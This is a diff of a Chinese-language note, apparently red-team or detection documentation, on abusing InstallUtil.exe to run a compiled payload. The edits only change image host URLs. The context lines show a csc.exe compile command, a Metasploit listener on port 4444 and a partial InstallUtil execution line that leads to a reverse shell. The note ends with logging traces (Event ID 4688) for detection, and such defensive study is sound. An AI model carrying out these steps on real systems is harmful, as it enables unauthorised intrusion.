@@ -96,7 +96,7 @@ cmMtjerv(IBtCWU);
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /r:System.IO.Compression.dll /target:library /out:Micropoor.exe  /unsafe C:\Users\Administrator\Desktop\a\installutil.cs
 ```
 
-![编译payload](https://img-blog.csdnimg.cn/20200413152034249.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MzM0NDY0,size_16,color_FFFFFF,t_70)
+![编译payload](https://image-host-toky.oss-cn-shanghai.aliyuncs.com/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MzM0NDY0,size_16,color_FFFFFF,t_70-20210720144602383.png)
 
 #### 执行监听
 
@@ -113,7 +113,7 @@ lport => 4444
 msf5 exploit(multi/handler) > exploit
 ```
 
-![监听](https://img-blog.csdnimg.cn/20200413152209214.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MzM0NDY0,size_16,color_FFFFFF,t_70)
+![监听](https://image-host-toky.oss-cn-shanghai.aliyuncs.com/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MzM0NDY0,size_16,color_FFFFFF,t_70-20210720144608434.png)
 
 #### 执行payload
 
@@ -123,7 +123,7 @@ C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogTo
 
 #### 反弹shell
 
-![执行payload](https://img-blog.csdnimg.cn/20200413152353294.png)
+![执行payload](https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200413152353294.png)
 
 ## 测试留痕
 
@@ -131,7 +131,7 @@ C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogTo
 EventID:4688 #安全日志，windows server 2012以上配置审核策略，可对命令参数进行记录
 ```
 
-![日志留痕](https://img-blog.csdnimg.cn/20200413152656624.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MzM0NDY0,size_16,color_FFFFFF,t_70)
+![日志留痕](https://image-host-toky.oss-cn-shanghai.aliyuncs.com/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MzM0NDY0,size_16,color_FFFFFF,t_70-20210720144616104.png)
 
 ## 检测规则/思路
 
